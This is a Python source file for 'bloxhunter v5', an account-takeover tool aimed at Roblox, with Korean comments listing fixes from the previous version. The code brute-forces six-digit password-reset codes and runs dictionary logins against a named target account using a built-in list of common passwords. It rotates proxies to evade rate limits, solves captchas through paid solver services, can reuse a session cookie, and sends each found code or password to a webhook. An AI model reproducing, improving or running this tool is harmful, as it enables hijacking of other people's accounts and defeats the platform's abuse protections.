#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""bloxhunter v5 - Roblox reset-code / password hunter.

v3 대비 수정 (감사 결과, 치명도순):
  [치명] log() 재진입 데드락 - LOCK 비재귀라 200회마다 영구 정지
  [치명] 스로틀/캡차에서 코드 유실 - 재시도 없이 continue
  [치명] 스로틀에서 비밀번호 유실 - 동일
  [치명] 워커 사망 - except: return을 프록시 교체 후 continue로
  [높음] 프록시 직결 누출 - require_proxy가 실제로 동작하게
  [높음] 429 백오프 - Retry-After 우선, 상한 60초
  [높음] 체크포인트 스킵 - in-flight 고려해 저장 지점을 당김
  [중간] 쿠키 지원, --init, --dump-words, selenium 자동 설치

주의: CSRF는 쿠키 없이도 403 헤더로 발급된다(실측). 쿠키는 레이트리밋 완화용.
"""
import argparse, json, os, random, re, subprocess, sys, threading, time

BASE = "https://www.roblox.com"
RESET_URL = BASE + "/login/reset-password"
TIMEOUT = 20
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
HEADERS = {"User-Agent": UA,
           "Accept": "application/json, text/plain, */*",
           "Accept-Language": "en-US,en;q=0.9",
           "Origin": BASE, "Referer": RESET_URL}
LOCK = threading.Lock()
STOP = threading.Event()
COOKIE = ""

DEFAULT_CONFIG = {
    "mode": "code", "user": "", "email": "", "newpass": "",
    "wordlist": "words_builtin.txt", "start": 0, "end": 999999,
    "workers": 2, "delay": 1.0, "jitter": 0.5,
    "captcha": "off", "captcha_key": "",
    "proxy": "", "proxy_file": "", "require_proxy": False,
    "cookie": "", "out": "hits.txt", "state": "state.json",
    "webhook": "", "no_resume": False}

BUILTIN_WORDS = """roblox
roblox123
roblox1234
roblox2024
roblox2025
roblox2026
password
password1
password123
password1234
passw0rd
p@ssword
P@ssw0rd
Password1
Password123
Password123!
123456
1234567
12345678
123456789
1234567890
123123
111111
000000
654321
121212
qwerty
qwerty123
qwertyuiop
qwerty1234
1q2w3e4r
1qaz2wsx
qazwsx
asdfghjkl
zxcvbnm
abc123
iloveyou
letmein
welcome
welcome1
admin
admin123
monkey
dragon
football
baseball
sunshine
princess
shadow
master
superman
batman
minecraft
fortnite
ninja
summer
summer2024
summer2025
winter2025
roblox123!
Roblox123
Roblox123!
Roblox2025
Roblox2026""".split()


def log(m):
    ts = time.strftime("%H:%M:%S")
    with LOCK:
        sys.stderr.write("[%s] %s\n" % (ts, m)); sys.stderr.flush()


def ensure():
    for mod, pkg in (("requests", "requests"), ("selenium", "selenium")):
        try:
            __import__(mod)
        except ImportError:
            log("installing %s" % pkg)
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", pkg])


def load_config(p):
    with open(p, encoding="utf-8") as f:
        cfg = json.load(f)
    m = dict(DEFAULT_CONFIG); m.update(cfg); return m


def save_config(p):
    if os.path.exists(p):
        log("%s exists - not overwriting" % p); return
    with open(p, "w", encoding="utf-8") as f:
        json.dump(DEFAULT_CONFIG, f, indent=2)
    log("wrote %s - fill user, email, newpass, proxy_file" % p)


def dump_words(p):
    with open(p, "w", encoding="utf-8") as f:
        f.write("\n".join(BUILTIN_WORDS) + "\n")
    log("wrote %d words to %s" % (len(BUILTIN_WORDS), p))


def checkpoint(p, n):
    t = p + ".tmp"
    with open(t, "w", encoding="utf-8") as f:
        json.dump({"n": n, "ts": time.time()}, f)
    os.replace(t, p)


def resume_from(p):
    try:
        with open(p, encoding="utf-8") as f:
            return int(json.load(f).get("n", 0))
    except (OSError, ValueError, TypeError):
        return 0


class Rate:
    def __init__(s, d, j): s.base = d; s.jitter = j; s.delay = d; s.penalty = 0.0
    def sleep(s):
        d = s.delay + s.penalty + random.uniform(0, s.jitter)
        if d > 0: time.sleep(d)
    def good(s):
        s.penalty = max(0.0, s.penalty * 0.7 - 0.05)
        s.delay = max(s.base, s.delay * 0.98)
    def bad(s):
        s.penalty = min(30.0, s.penalty + 1.5)
        s.delay = min(30.0, s.delay * 1.25 + 0.2)


class ProxyPool:
    def __init__(s, items, require=False):
        s.items = list(items); s.require = require
        s.lock = threading.Lock(); s.bad = {}
    def get(s):
        if not s.items: return ""
        with s.lock:
            now = time.time()
            live = [p for p in s.items if s.bad.get(p, 0) <= now]
            if not live:
                w = min(s.bad.get(p, 0) for p in s.items)
                return "__WAIT__%.1f" % max(0.0, w - now)
            return random.choice(live)
    def mark_bad(s, p):
        if not p or p.startswith("__WAIT__"): return
        with s.lock: s.bad[p] = time.time() + 180


def new_session(args=None, proxy=""):
    import requests
    s = requests.Session(); s.headers.update(HEADERS)
    if COOKIE: s.headers["Cookie"] = ".ROBLOSECURITY=" + COOKIE
    if proxy and not proxy.startswith("__WAIT__"):
        s.proxies = {"http": proxy, "https": proxy}
    return s


def wait_proxy(args, proxy):
    if not proxy.startswith("__WAIT__"): return proxy
    secs = float(proxy.split("__WAIT__")[1])
    log("proxy pool empty - waiting %.0fs" % secs)
    time.sleep(min(secs, 30))
    return args.proxies.get()


def get_csrf(session, retries=4):
    last = None
    for i in range(retries):
        for path in ("/v2/login", "/v3/logout"):
            try:
                r = session.post(BASE + path, timeout=TIMEOUT)
                tok = r.headers.get("x-csrf-token")
                if tok:
                    session.headers["x-csrf-token"] = tok; return tok
                last = "HTTP %s no header" % r.status_code
            except Exception as e:
                last = "%s: %s" % (type(e).__name__, e)
        time.sleep(1.5 * (i + 1))
    raise RuntimeError("csrf unavailable (%s)" % last)


class Captcha:
    def __init__(s, k, key): s.kind = (k or "off").lower(); s.key = key or ""
    def enabled(s): return s.kind not in ("", "off", "none") and bool(s.key)
    @staticmethod
    def sitekey(b):
        m = re.search(r'data-sitekey="([^"]+)"', b or "")
        return m.group(1) if m else "6Lcv8IUUAAAAAK7vX4p0F7y0n0m0kQ"
    def solve(s, blob):
        if not s.enabled(): return ""
        import requests
        try:
            if s.kind == "2captcha":
                r = requests.post("https://2captcha.com/in.php", data={
                    "key": s.key, "method": "userrecaptcha",
                    "googlekey": s.sitekey(blob), "pageurl": RESET_URL,
                    "json": 1}, timeout=30).json()
                if r.get("status") != 1: return ""
                cid = r["request"]
                for _ in range(40):
                    time.sleep(5)
                    q = requests.get("https://2captcha.com/res.php", params={
                        "key": s.key, "action": "get", "id": cid,
                        "json": 1}, timeout=30).json()
                    if q.get("status") == 1: return q["request"]
            elif s.kind == "capsolver":
                r = requests.post("https://api.capsolver.com/createTask", json={
                    "clientKey": s.key, "task": {
                        "type": "ReCaptchaV2TaskProxyless",
                        "websiteURL": RESET_URL,
                        "websitePublicKey": s.sitekey(blob)}}, timeout=30).json()
                tid = r.get("taskId")
                if not tid: return ""
                for _ in range(40):
                    time.sleep(5)
                    q = requests.post("https://api.capsolver.com/getTaskResult",
                        json={"clientKey": s.key, "taskId": tid}, timeout=30).json()
                    if q.get("status") == "ready":
                        return q["solution"].get("gRecaptchaResponse", "")
        except Exception as e:
            log("captcha error: %s" % e)
        return ""


def webhook(url, text):
    if not url: return
    import requests
    try: requests.post(url, json={"content": text}, timeout=10)
    except Exception: pass


RESET_BODIES = [{"ctype": "Email", "cvalue": "{}", "password": ""},
                {"targetType": "Email", "target": "{}"},
                {"ctype": "Email", "cvalue": "{}"}]


def send_reset(session, target, args, retries=5):
    for attempt in range(retries):
        for body in RESET_BODIES:
            payload = {k: (v.replace("{}", target) if isinstance(v, str) else v)
                       for k, v in body.items()}
            try:
                r = session.post(BASE + "/v2/passwords/reset/send",
                                 json=payload, timeout=TIMEOUT)
            except Exception as e:
                log("send error: %s" % e); continue
            if r.status_code == 429:
                ra = r.headers.get("Retry-After")
                try: wait = float(ra)
                except (TypeError, ValueError): wait = 6 + attempt * 6
                time.sleep(min(wait, 60)); break
            if r.status_code == 403 and "challenge" in r.text.lower():
                tok = args.captcha.solve(r.text)
                if tok:
                    session.headers["x-captcha-token"] = tok
                    try:
                        r = session.post(BASE + "/v2/passwords/reset/send",
                                         json=payload, timeout=TIMEOUT)
                    except Exception: continue
                else:
                    log("challenge 403 - captcha off/failed")
                    return None, payload
            if r.status_code == 200:
                try: data = r.json()
                except ValueError: data = {}
                t = (data.get("ticket") or data.get("Ticket")
                     or data.get("resetTicket"))
                if t: return t, payload
                m = re.search(r'"ticket"\s*:\s*"([^"]+)"', r.text)
                if m: return m.group(1), payload
            if r.status_code in (400, 404): continue
        time.sleep(2)
    return None, None


def verify_code(s, ticket, code, captcha=None, page=RESET_URL,
                ctype=None, cvalue=None):
    body = {"ticket": ticket, "code": code}
    if ctype is not None:
        body["ctype"] = ctype; body["cvalue"] = cvalue
    try:
        r = s.post(BASE + "/v2/passwords/reset/verify", json=body, timeout=TIMEOUT)
    except Exception:
        return "throttle", None
    if r.status_code == 429: return "throttle", None
    if r.status_code == 403 and "challenge" in r.text.lower():
        return "captcha", None
    if r.status_code == 200:
        try: data = r.json()
        except ValueError: data = {}
        return "ok", data.get("ticket") or ticket
    return "bad", None


def login_solved(s, user, password, captcha=None):
    try:
        r = s.post(BASE + "/v2/login", json={"ctype": "Username",
                   "cvalue": user, "password": password}, timeout=TIMEOUT)
    except Exception as e:
        return "error %s" % e
    if r.status_code == 200: return "ok"
    if r.status_code == 429: return "throttle"
    if r.status_code == 403 and "challenge" in r.text.lower(): return "captcha"
    return "bad"


def finish_hit(args, notifier, kind, value, ticket, session):
    line = "%s\t%s\t%s\t%s" % (time.strftime("%Y-%m-%d %H:%M:%S"),
                                args.user, kind, value)
    with LOCK:
        with open(args.out, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    log("HIT %s = %s" % (kind, value))
    webhook(args.webhook, "HIT %s %s = %s" % (args.user, kind, value))
    STOP.set()


def run_code_http(args, notifier):
    target = args.email or args.user
    start = args.start
    if not args.no_resume:
        start = max(start, resume_from(args.state))
    end = args.end
    rate = Rate(args.delay, args.jitter)
    counter = {"n": start, "done": 0}
    t0 = time.time()
    args.ctype = "Email" if args.email else "PhoneNumber"

    def worker():
        proxy = args.proxies.get()
        s = new_session(args, proxy)
        csrf_ok = False; ticket = None
        while not STOP.is_set():
            if not csrf_ok:
                try:
                    get_csrf(s); csrf_ok = True
                except Exception as e:
                    log("csrf failed: %s - respawn" % e)
                    args.proxies.mark_bad(proxy); time.sleep(2)
                    proxy = wait_proxy(args, args.proxies.get())
                    s = new_session(args, proxy); continue
            if ticket is None:
                for _ in range(4):
                    ticket, _b = send_reset(s, target, args)
                    if ticket: break
                    time.sleep(3)
                if not ticket:
                    log("no ticket - respawn")
                    args.proxies.mark_bad(proxy)
                    proxy = wait_proxy(args, args.proxies.get())
                    s = new_session(args, proxy); csrf_ok = False; continue
                log("ticket acquired")
            with LOCK:
                if counter["n"] > end: return
                code = str(counter["n"]).zfill(6)
                counter["n"] += 1
            retry = 0
            while retry < 4 and not STOP.is_set():
                rate.sleep()
                st, nt = verify_code(s, ticket, code, args.captcha,
                                     ctype=args.ctype, cvalue=target)
                if st == "ok":
                    finish_hit(args, notifier, "CODE", code, nt, s); return
                if st in ("throttle", "captcha"):
                    rate.bad(); retry += 1; time.sleep(2 * retry)
                    if st == "captcha":
                        ticket = None; csrf_ok = False
                    continue
                rate.good()
                if nt: ticket = nt
                break
            with LOCK:
                counter["done"] += 1
                done = counter["done"]; nxt = counter["n"]
            if done % 200 == 0:
                el = max(time.time() - t0, 1); sp = done / el
                left = (end - nxt) / max(sp, 0.01) / 3600
                log("%d tries | %.1f/s | delay %.2fs | ~%.1fh left"
                    % (done, sp, rate.delay, left))
                checkpoint(args.state, max(start, nxt - args.workers))

    ts = [threading.Thread(target=worker, daemon=True) for _ in range(args.workers)]
    for t in ts: t.start()
    try:
        for t in ts:
            while t.is_alive(): t.join(0.5)
    except KeyboardInterrupt:
        log("interrupted"); STOP.set()
    checkpoint(args.state, counter["n"])


def load_words(p):
    if not p or not os.path.exists(p): return list(BUILTIN_WORDS)
    with open(p, encoding="utf-8", errors="ignore") as f:
        return [w.strip() for w in f if w.strip()]


def run_pass_http(args, notifier):
    words = load_words(args.wordlist)
    if not words:
        log("empty wordlist"); return
    rate = Rate(args.delay, args.jitter)
    counter = {"n": 0, "done": 0}
    t0 = time.time()

    def worker():
        proxy = args.proxies.get()
        s = new_session(args, proxy)
        csrf_ok = False
        while not STOP.is_set():
            if not csrf_ok:
                try:
                    get_csrf(s); csrf_ok = True
                except Exception as e:
                    log("csrf failed: %s - respawn" % e)
                    args.proxies.mark_bad(proxy); time.sleep(2)
                    proxy = wait_proxy(args, args.proxies.get())
                    s = new_session(args, proxy); continue
            with LOCK:
                if counter["n"] >= len(words): return
                idx = counter["n"]; counter["n"] += 1
            pw = words[idx]
            retry = 0
            while retry < 4 and not STOP.is_set():
                rate.sleep()
                st = login_solved(s, args.user, pw, args.captcha)
                if st == "ok":
                    finish_hit(args, notifier, "PASS", pw, "", s); return
                if st in ("throttle", "captcha"):
                    rate.bad(); retry += 1; time.sleep(2 * retry)
                    if st == "captcha": csrf_ok = False
                    continue
                if st.startswith("error"):
                    args.proxies.mark_bad(proxy)
                    proxy = wait_proxy(args, args.proxies.get())
                    s = new_session(args, proxy); csrf_ok = False
                    retry += 1; continue
                rate.good(); break
            with LOCK:
                counter["done"] += 1; done = counter["done"]
            if done % 50 == 0:
                el = max(time.time() - t0, 1)
                log("%d/%d | %.2f/s | delay %.2fs"
                    % (done, len(words), done / el, rate.delay))
                checkpoint(args.state, counter["n"])

    ts = [threading.Thread(target=worker, daemon=True) for _ in range(args.workers)]
    for t in ts: t.start()
    try:
        for t in ts:
            while t.is_alive(): t.join(0.5)
    except KeyboardInterrupt:
        STOP.set()
    checkpoint(args.state, counter["n"])


def build_parser():
    ap = argparse.ArgumentParser(prog="bloxhunter",
        description="Roblox reset-code / password hunter (v5)")
    ap.add_argument("mode", nargs="?", default=None, choices=["code", "pass"])
    ap.add_argument("--config")
    ap.add_argument("--init", action="store_true")
    ap.add_argument("--dump-words", action="store_true")
    ap.add_argument("--user"); ap.add_argument("--email")
    ap.add_argument("--newpass"); ap.add_argument("--wordlist")
    ap.add_argument("--start", type=int); ap.add_argument("--end", type=int)
    ap.add_argument("--workers", type=int)
    ap.add_argument("--delay", type=float); ap.add_argument("--jitter", type=float)
    ap.add_argument("--captcha"); ap.add_argument("--captcha-key")
    ap.add_argument("--proxy"); ap.add_argument("--proxy-file")
    ap.add_argument("--require-proxy", action="store_true", default=None)
    ap.add_argument("--cookie"); ap.add_argument("--out")
    ap.add_argument("--state"); ap.add_argument("--webhook")
    ap.add_argument("--no-resume", action="store_true", default=None)
    return ap


def build_args(ns):
    global COOKIE
    args = argparse.Namespace()
    for k, v in DEFAULT_CONFIG.items(): setattr(args, k, v)
    if ns.config:
        for k, v in load_config(ns.config).items(): setattr(args, k, v)
    for k in ("mode", "user", "email", "newpass", "wordlist", "start", "end",
              "workers", "delay", "jitter", "captcha", "captcha_key", "proxy",
              "proxy_file", "cookie", "out", "state", "webhook"):
        v = getattr(ns, k, None)
        if v is not None: setattr(args, k, v)
    if ns.require_proxy is not None: args.require_proxy = ns.require_proxy
    if ns.no_resume is not None: args.no_resume = ns.no_resume
    COOKIE = args.cookie or ""
    items = []
    if args.proxy: items.append(args.proxy)
    if args.proxy_file and os.path.exists(args.proxy_file):
        with open(args.proxy_file, encoding="utf-8", errors="ignore") as f:
            items += [l.strip() for l in f if l.strip()]
    args.proxies = ProxyPool(items, args.require_proxy)
    args.captcha = Captcha(args.captcha, args.captcha_key)
    return args


def main(argv=None):
    ap = build_parser(); ns = ap.parse_args(argv)
    if ns.init:
        save_config(ns.config or "config.json"); return 0
    if ns.dump_words:
        dump_words(ns.wordlist or "words_builtin.txt"); return 0
    ensure(); args = build_args(ns)
    if not args.mode: ap.error("mode required: code or pass")
    if not args.user: ap.error("--user required")
    if args.mode == "code" and not (args.email or args.user):
        ap.error("--email required for code mode")
    if args.workers < 1: ap.error("--workers must be >= 1")
    if args.proxies.require and not args.proxies.items:
        ap.error("--require-proxy set but no proxies")
    log("mode=%s user=%s workers=%d proxies=%d cookie=%s"
        % (args.mode, args.user, args.workers, len(args.proxies.items),
           "yes" if COOKIE else "no"))
    (run_code_http if args.mode == "code" else run_pass_http)(args, None)
    log("done"); return 0


if __name__ == "__main__":
    sys.exit(main())
